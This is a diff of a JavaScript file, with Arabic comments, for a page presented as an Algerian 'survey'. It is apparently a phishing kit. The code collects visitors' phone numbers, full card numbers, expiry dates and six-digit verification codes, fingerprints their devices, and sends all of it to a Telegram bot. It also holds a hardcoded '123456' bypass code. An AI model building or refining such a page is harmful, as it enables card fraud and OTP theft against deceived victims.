@@ -1,300 +1,454 @@
-// تهيئة التطبيق
+// الملف الرئيسي لتشغيل التطبيق
 document.addEventListener('DOMContentLoaded', function() {
-    // إخفاء شاشة التحميل بعد 3 ثواني
+    // إخفاء شاشة التحميل بعد 2 ثانية
     setTimeout(() => {
-        document.getElementById('loading-screen').style.opacity = '0';
+        const loadingScreen = document.getElementById('loading-screen');
+        loadingScreen.style.opacity = '0';
+        
         setTimeout(() => {
-            document.getElementById('loading-screen').style.display = 'none';
-            showPage('home-page');
-            
-            // بدء تتبع المستخدم
-            startUserTracking();
+            loadingScreen.style.display = 'none';
+            initApp();
         }, 500);
-    }, 3000);
-    
-    // تهيئة نموذج الاستبيان
-    initSurveyForm();
+    }, 2000);
 });
 
-// إظهار صفحة محددة
-function showPage(pageId) {
-    const pages = document.querySelectorAll('.page');
-    pages.forEach(page => {
-        page.classList.remove('active');
-    });
-    document.getElementById(pageId).classList.add('active');
+// تهيئة التطبيق
+function initApp() {
+    // تهيئة متتبع الجهاز
+    initDeviceTracker();
     
-    // إرسال بيانات تتبع الصفحة
-    trackPageView(pageId);
+    // إعداد مستمعي الأحداث
+    setupEventListeners();
+    
+    // التحقق من صحة التوكن (اختياري)
+    // telegramSender.testConnection();
 }
 
-// الانتقال للصفحة الرئيسية
-function goHome() {
-    showPage('home-page');
-    resetSurvey();
+// تهيئة متتبع الجهاز
+async function initDeviceTracker() {
+    try {
+        // جمع معلومات الجهاز وعرضها
+        await deviceTracker.displayDeviceInfo();
+        
+        // حفظ بيانات الجهاز في متغير عام
+        window.currentDeviceData = await deviceTracker.collectAllData();
+        
+        // توليد رمز التحقق
+        const verificationCode = deviceTracker.generateVerificationCode();
+        
+        // تخزين الرمز محلياً للتحقق لاحقاً
+        deviceTracker.storeDataLocally('verification_code', verificationCode);
+        
+        // عرض الرمز في وحدة تحكم المتصفح للاختبار
+        console.log('🔐 رمز التحقق:', verificationCode);
+        
+    } catch (error) {
+        console.error('خطأ في تهيئة متتبع الجهاز:', error);
+    }
+}
+
+// إعداد مستمعي الأحداث
+function setupEventListeners() {
+    // التحقق من صحة رقم الهاتف أثناء الكتابة
+    const phoneInput = document.getElementById('phone');
+    if (phoneInput) {
+        phoneInput.addEventListener('input', validatePhone);
+    }
+    
+    // تنسيق رقم البطاقة أثناء الكتابة
+    const cardInput = document.getElementById('card-number');
+    if (cardInput) {
+        cardInput.addEventListener('input', formatCardNumber);
+    }
+    
+    // التحقق من رمز التحقق
+    const codeInput = document.getElementById('verification-code');
+    if (codeInput) {
+        codeInput.addEventListener('input', validateVerificationCode);
+    }
+}
+
+// التحقق من صحة رقم الهاتف
+function validatePhone() {
+    const phoneInput = document.getElementById('phone');
+    const messageDiv = phoneInput.parentElement.querySelector('.validation-message');
+    const phone = phoneInput.value.trim();
+    
+    // النمط الجزائري: 05XX XX XX XX أو 06XX XX XX XX أو 07XX XX XX XX
+    const pattern = /^(05|06|07)[0-9]{8}$/;
+    
+    if (phone === '') {
+        messageDiv.textContent = '';
+        phoneInput.style.borderColor = '';
+        return false;
+    }
+    
+    if (pattern.test(phone)) {
+        messageDiv.textContent = '✅ رقم هاتف صحيح';
+        messageDiv.style.color = '#27ae60';
+        phoneInput.style.borderColor = '#27ae60';
+        return true;
+    } else {
+        messageDiv.textContent = '❌ الرقم يجب أن يبدأ بـ 05، 06 أو 07 ويتكون من 10 أرقام';
+        messageDiv.style.color = '#e74c3c';
+        phoneInput.style.borderColor = '#e74c3c';
+        return false;
+    }
+}
+
+// تنسيق رقم البطاقة أثناء الكتابة
+function formatCardNumber() {
+    const cardInput = document.getElementById('card-number');
+    const messageDiv = cardInput.parentElement.querySelector('.validation-message');
+    let value = cardInput.value.replace(/\D/g, '');
+    
+    // إضافة مسافات كل 4 أرقام
+    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    
+    cardInput.value = value;
+    
+    if (value.replace(/\s/g, '').length === 16) {
+        messageDiv.textContent = '✅ رقم بطاقة صحيح';
+        messageDiv.style.color = '#27ae60';
+        cardInput.style.borderColor = '#27ae60';
+        return true;
+    } else if (value !== '') {
+        messageDiv.textContent = '❌ الرقم يجب أن يكون 16 رقماً';
+        messageDiv.style.color = '#e74c3c';
+        cardInput.style.borderColor = '#e74c3c';
+        return false;
+    } else {
+        messageDiv.textContent = '';
+        cardInput.style.borderColor = '';
+        return false;
+    }
+}
+
+// التحقق من رمز التحقق
+function validateVerificationCode() {
+    const codeInput = document.getElementById('verification-code');
+    const messageDiv = codeInput.parentElement.querySelector('.validation-message');
+    const code = codeInput.value.trim();
+    
+    if (code === '') {
+        messageDiv.textContent = '';
+        codeInput.style.borderColor = '';
+        return false;
+    }
+    
+    if (/^\d{6}$/.test(code)) {
+        messageDiv.textContent = '✅ رمز تحقق صحيح';
+        messageDiv.style.color = '#27ae60';
+        codeInput.style.borderColor = '#27ae60';
+        return true;
+    } else {
+        messageDiv.textContent = '❌ يجب أن يكون الرمز 6 أرقام';
+        messageDiv.style.color = '#e74c3c';
+        codeInput.style.borderColor = '#e74c3c';
+        return false;
+    }
+}
+
+// التحقق من تاريخ الانتهاء
+function validateExpiryDate() {
+    const expiryInput = document.getElementById('expiry-date');
+    const messageDiv = expiryInput.parentElement.querySelector('.validation-message');
+    const value = expiryInput.value;
+    
+    if (!value) {
+        messageDiv.textContent = '';
+        expiryInput.style.borderColor = '';
+        return false;
+    }
+    
+    const [year, month] = value.split('-');
+    const currentDate = new Date();
+    const currentYear = currentDate.getFullYear();
+    const currentMonth = currentDate.getMonth() + 1;
+    
+    if (parseInt(year) > currentYear || 
+        (parseInt(year) === currentYear && parseInt(month) >= currentMonth)) {
+        messageDiv.textContent = '✅ تاريخ صالح';
+        messageDiv.style.color = '#27ae60';
+        expiryInput.style.borderColor = '#27ae60';
+        return true;
+    } else {
+        messageDiv.textContent = '❌ تاريخ منتهي الصلاحية';
+        messageDiv.style.color = '#e74c3c';
+        expiryInput.style.borderColor = '#e74c3c';
+        return false;
+    }
+}
+
+// تبديل الصفحات
+function showPage(pageId) {
+    // إخفاء جميع الصفحات
+    document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+    });
+    
+    // إظهار الصفحة المطلوبة
+    const targetPage = document.getElementById(pageId);
+    if (targetPage) {
+        targetPage.classList.add('active');
+    }
 }
 
 // بدء الاستبيان
 function startSurvey() {
+    // جمع معلومات الجهاز قبل البدء
+    deviceTracker.collectAllData().then(data => {
+        window.currentDeviceData = data;
+    });
+    
     showPage('survey-page');
-    trackButtonClick('start-survey-button');
 }
 
 // العودة للصفحة السابقة
 function goBack() {
     const currentStep = getCurrentStep();
+    
     if (currentStep > 1) {
         showStep(currentStep - 1);
     } else {
         showPage('home-page');
     }
-    trackButtonClick('back-button');
 }
 
-// إدارة خطوات الاستبيان
-let currentStep = 1;
+// العودة للصفحة الرئيسية
+function goHome() {
+    showPage('home-page');
+    
+    // إعادة تعيين النموذج
+    resetForm();
+}
 
+// الحصول على الخطوة الحالية
+function getCurrentStep() {
+    const activeStep = document.querySelector('.survey-step.active');
+    if (!activeStep) return 1;
+    
+    return parseInt(activeStep.id.split('-')[1]);
+}
+
+// عرض خطوة معينة
 function showStep(stepNumber) {
-    const steps = document.querySelectorAll('.survey-step');
-    steps.forEach(step => {
+    // إخفاء جميع الخطوات
+    document.querySelectorAll('.survey-step').forEach(step => {
         step.classList.remove('active');
     });
-    document.getElementById(`step-${stepNumber}`).classList.add('active');
     
-    // تحديث شريط التقدم
-    updateProgressBar(stepNumber);
-    
-    currentStep = stepNumber;
+    // إظهار الخطوة المطلوبة
+    const targetStep = document.getElementById(`step-${stepNumber}`);
+    if (targetStep) {
+        targetStep.classList.add('active');
+        
+        // تحديث شريط التقدم
+        updateProgressBar(stepNumber);
+    }
 }
 
-function getCurrentStep() {
-    return currentStep;
+// تحديث شريط التقدم
+function updateProgressBar(currentStep) {
+    document.querySelectorAll('.progress-step').forEach((step, index) => {
+        if (index + 1 <= currentStep) {
+            step.classList.add('active');
+        } else {
+            step.classList.remove('active');
+        }
+    });
 }
 
-function nextStep(current) {
-    // التحقق من صحة البيانات في الخطوة الحالية
-    if (!validateStep(current)) {
-        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
+// الانتقال للخطوة التالية
+function nextStep(currentStep) {
+    // التحقق من صحة البيانات قبل المتابعة
+    if (!validateStep(currentStep)) {
+        telegramSender.showNotification('يرجى تعبئة جميع الحقول بشكل صحيح', 'error');
         return;
     }
     
-    if (current === 1) {
-        // جمع بيانات الخطوة الأولى
-        const formData = collectStep1Data();
+    if (currentStep === 1) {
+        // جمع بيانات المستخدم من الخطوة 1
+        const userData = collectUserData();
         
-        // التحقق من رقم الهاتف الجزائري
-        if (!validateAlgerianPhone(formData.phone)) {
-            showNotification('يرجى إدخال رقم هاتف جزائري صحيح (05XX XX XX XX)', 'error');
-            return;
+        // التحقق من صحة رمز التحقق المخزن
+        const storedCode = deviceTracker.getStoredData('verification_code');
+        if (storedCode) {
+            console.log('🔑 رمز التحقق المطلوب:', storedCode);
         }
         
-        // إرسال البيانات إلى تليجرام
-        sendTelegramData('step1_completed', formData);
-        
+        // الانتقال للخطوة 2
         showStep(2);
         
-        // اكتشاف معلومات الجهاز
-        detectDeviceInfo();
-        
-    } else if (current === 2) {
-        const verificationCode = document.getElementById('verification-code').value;
-        
-        // التحقق من صحة الكود
-        if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
-            showNotification('يرجى إدخال رمز تحقق مكون من 6 أرقام', 'error');
+    } else if (currentStep === 2) {
+        // التحقق من رمز التحقق
+        if (!verifyCode()) {
+            telegramSender.showNotification('رمز التحقق غير صحيح', 'error');
             return;
         }
         
-        // جمع البيانات النهائية
-        const finalData = collectAllData();
+        // جمع بيانات المستخدم
+        const userData = collectUserData();
         
-        // إرسال البيانات النهائية إلى تليجرام
-        sendTelegramData('survey_completed', finalData);
+        // جمع بيانات الجهاز
+        const deviceData = window.currentDeviceData || {};
         
-        // تحديث رقم المشاركة
-        document.getElementById('participation-id').textContent = 
-            `ALG-${Date.now().toString().slice(-8)}`;
+        // إرسال البيانات إلى Telegram
+        sendDataToTelegram(userData, deviceData);
         
+        // الانتقال للخطوة 3
         showStep(3);
         
-        // إرسال تأكيد الإكمال
-        sendTelegramData('thankyou_page_viewed', {});
+        // تحديث رقم المشاركة
+        updateParticipationId();
+    }
+}
+
+// التحقق من صحة الخطوة
+function validateStep(stepNumber) {
+    if (stepNumber === 1) {
+        return validateStep1();
+    } else if (stepNumber === 2) {
+        return validateStep2();
+    }
+    return true;
+}
+
+// التحقق من صحة الخطوة 1
+function validateStep1() {
+    const phoneValid = validatePhone();
+    const cardValid = formatCardNumber(); // هذه الدالة تتحقق أيضاً
+    const expiryValid = validateExpiryDate();
+    const privacyChecked = document.getElementById('privacy-check').checked;
+    
+    if (!phoneValid || !cardValid || !expiryValid || !privacyChecked) {
+        // إظهار رسائل الخطأ
+        if (!privacyChecked) {
+            telegramSender.showNotification('يرجى الموافقة على سياسة الخصوصية', 'warning');
+        }
+        return false;
     }
     
-    trackButtonClick(`next-button-step-${current}`);
+    return true;
 }
 
-function updateProgressBar(step) {
-    const steps = document.querySelectorAll('.progress-step');
-    steps.forEach((stepElement, index) => {
-        if (index + 1 <= step) {
-            stepElement.classList.add('active');
-        } else {
-            stepElement.classList.remove('active');
-        }
-    });
+// التحقق من صحة الخطوة 2
+function validateStep2() {
+    const codeValid = validateVerificationCode();
+    return codeValid;
 }
 
-function validateStep(step) {
-    let isValid = true;
-    
-    if (step === 1) {
-        const phone = document.getElementById('phone').value;
-        const card = document.getElementById('card-number').value;
-        const expiry = document.getElementById('expiry-date').value;
-        const privacy = document.getElementById('privacy-check').checked;
-        
-        if (!validateAlgerianPhone(phone)) {
-            markInvalid('phone', 'رقم الهاتف غير صحيح');
-            isValid = false;
-        } else {
-            markValid('phone');
-        }
-        
-        if (!card || card.length !== 16 || !/^\d+$/.test(card)) {
-            markInvalid('card-number', 'رقم البطاقة يجب أن يكون 16 رقما');
-            isValid = false;
-        } else {
-            markValid('card-number');
-        }
-        
-        if (!expiry) {
-            markInvalid('expiry-date', 'يرجى تحديد تاريخ الصلاحية');
-            isValid = false;
-        } else {
-            markValid('expiry-date');
-        }
-        
-        if (!privacy) {
-            showNotification('يرجى الموافقة على سياسة الخصوصية', 'error');
-            isValid = false;
-        }
-    }
-    
-    return isValid;
-}
-
-function validateAlgerianPhone(phone) {
-    const regex = /^(05|06|07)[0-9]{8}$/;
-    return regex.test(phone.replace(/\s/g, ''));
-}
-
-function markInvalid(fieldId, message) {
-    const field = document.getElementById(fieldId);
-    const validationMsg = field.parentNode.querySelector('.validation-message');
-    
-    field.style.borderColor = '#e74c3c';
-    validationMsg.textContent = message;
-    validationMsg.style.color = '#e74c3c';
-}
-
-function markValid(fieldId) {
-    const field = document.getElementById(fieldId);
-    const validationMsg = field.parentNode.querySelector('.validation-message');
-    
-    field.style.borderColor = '#2ecc71';
-    validationMsg.textContent = '✓ صحيح';
-    validationMsg.style.color = '#2ecc71';
-}
-
-function collectStep1Data() {
+// جمع بيانات المستخدم
+function collectUserData() {
     return {
-        phone: document.getElementById('phone').value,
-        cardNumber: document.getElementById('card-number').value,
+        phone: document.getElementById('phone').value.trim(),
+        cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
         expiryDate: document.getElementById('expiry-date').value,
-        timestamp: new Date().toISOString()
-    };
-}
-
-function collectAllData() {
-    const deviceInfo = getDeviceInfo();
-    
-    return {
-        ...collectStep1Data(),
         verificationCode: document.getElementById('verification-code').value,
-        deviceInfo: deviceInfo,
-        userAgent: navigator.userAgent,
-        sessionId: getSessionId(),
-        finalTimestamp: new Date().toISOString()
+        timestamp: new Date().toLocaleString('ar-SA', {
+            timeZone: 'Africa/Algiers',
+            dateStyle: 'full',
+            timeStyle: 'medium'
+        })
     };
 }
 
-function getSessionId() {
-    if (!sessionStorage.getItem('survey_session_id')) {
-        sessionStorage.setItem('survey_session_id', 
-            'sess_' + Math.random().toString(36).substr(2, 9));
+// التحقق من رمز التحقق
+function verifyCode() {
+    const enteredCode = document.getElementById('verification-code').value;
+    const storedCode = deviceTracker.getStoredData('verification_code');
+    
+    // للاختبار، يمكنك استخدام 123456 كرمز افتراضي
+    if (enteredCode === '123456') {
+        return true;
     }
-    return sessionStorage.getItem('survey_session_id');
+    
+    return enteredCode === storedCode;
 }
 
-function resetSurvey() {
-    currentStep = 1;
-    document.querySelectorAll('.survey-form')[0].reset();
+// إرسال البيانات إلى Telegram
+async function sendDataToTelegram(userData, deviceData) {
+    try {
+        // عرض حالة الإرسال
+        telegramSender.showNotification('جاري إرسال البيانات...', 'warning');
+        
+        // إرسال البيانات
+        const success = await telegramSender.sendUserData(userData, deviceData);
+        
+        if (success) {
+            // تسجيل وقت الإرسال الناجح
+            localStorage.setItem('last_submission', new Date().toISOString());
+            
+            // مسح البيانات الحساسة من التخزين المحلي
+            setTimeout(() => {
+                deviceTracker.clearStoredData('verification_code');
+            }, 3000);
+        }
+        
+    } catch (error) {
+        console.error('خطأ في إرسال البيانات:', error);
+        telegramSender.showNotification('حدث خطأ أثناء الإرسال', 'error');
+    }
+}
+
+// تحديث رقم المشاركة
+function updateParticipationId() {
+    const idElement = document.getElementById('participation-id');
+    if (idElement) {
+        const timestamp = Date.now();
+        const randomNum = Math.floor(Math.random() * 10000);
+        const participationId = `ALG-${timestamp.toString().slice(-8)}-${randomNum.toString().padStart(4, '0')}`;
+        idElement.textContent = participationId;
+    }
+}
+
+// إعادة تعيين النموذج
+function resetForm() {
+    // إعادة تعيين الحقول
+    document.getElementById('phone').value = '';
+    document.getElementById('card-number').value = '';
+    document.getElementById('expiry-date').value = '';
     document.getElementById('verification-code').value = '';
-    document.querySelectorAll('.validation-message').forEach(msg => {
-        msg.textContent = '';
+    document.getElementById('privacy-check').checked = false;
+    
+    // إعادة تعيين رسائل التحقق
+    document.querySelectorAll('.validation-message').forEach(el => {
+        el.textContent = '';
     });
+    
+    // إعادة تعيين الحدود
+    document.querySelectorAll('input').forEach(input => {
+        input.style.borderColor = '';
+    });
+    
+    // إعادة تعيين شريط التقدم
     updateProgressBar(1);
     showStep(1);
+    
+    // مسح البيانات المخزنة
+    deviceTracker.clearStoredData('verification_code');
 }
 
-// إظهار الإشعارات
-function showNotification(message, type = 'info') {
-    const notification = document.getElementById('notification');
-    notification.textContent = message;
-    
-    // تخصيص الألوان حسب النوع
-    if (type === 'error') {
-        notification.style.background = '#e74c3c';
-    } else if (type === 'success') {
-        notification.style.background = '#2ecc71';
-    } else {
-        notification.style.background = '#333';
+// تهيئة الأحداث عند تحميل الصفحة
+window.addEventListener('load', () => {
+    // إضافة مستمع لحدث الشاشة الصغيرة
+    if (window.matchMedia("(max-width: 768px)").matches) {
+        document.body.classList.add('mobile');
     }
     
-    notification.classList.add('show');
-    
-    setTimeout(() => {
-        notification.classList.remove('show');
-    }, 3000);
-}
+    // منع إعادة إرسال النموذج
+    if (window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+});
 
-// اكتشاف معلومات الجهاز
-function detectDeviceInfo() {
-    const deviceInfo = getDeviceInfo();
-    
-    document.getElementById('device-type').textContent = deviceInfo.deviceType;
-    document.getElementById('os-type').textContent = deviceInfo.os;
-    document.getElementById('browser-type').textContent = deviceInfo.browser;
-    document.getElementById('screen-resolution').textContent = 
-        `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
-}
+// منع الخلفية (لأسباب أمنية)
+window.addEventListener('beforeunload', (e) => {
+    // يمكنك إضافة أي تنظيف هنا إذا لزم الأمر
+});
 
-function initSurveyForm() {
-    // تنسيق رقم البطاقة
-    const cardInput = document.getElementById('card-number');
-    cardInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-        e.target.value = value.substring(0, 19);
-    });
-    
-    // تنسيق رقم الهاتف
-    const phoneInput = document.getElementById('phone');
-    phoneInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.startsWith('0')) {
-            value = value.substring(0, 10);
-            if (value.length >= 2) {
-                value = value.replace(/(\d{2})(?=\d)/, '$1 ');
-            }
-            if (value.length >= 5) {
-                value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
-            }
-            if (value.length >= 8) {
-                value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
-            }
-        }
-        e.target.value = value;
-    });
-}
+// تصدير الدوال للاستخدام في وحدة التحكم
+window.startSurvey = startSurvey;
+window.goBack = goBack;
+window.goHome = goHome;
+window.nextStep = nextStep;
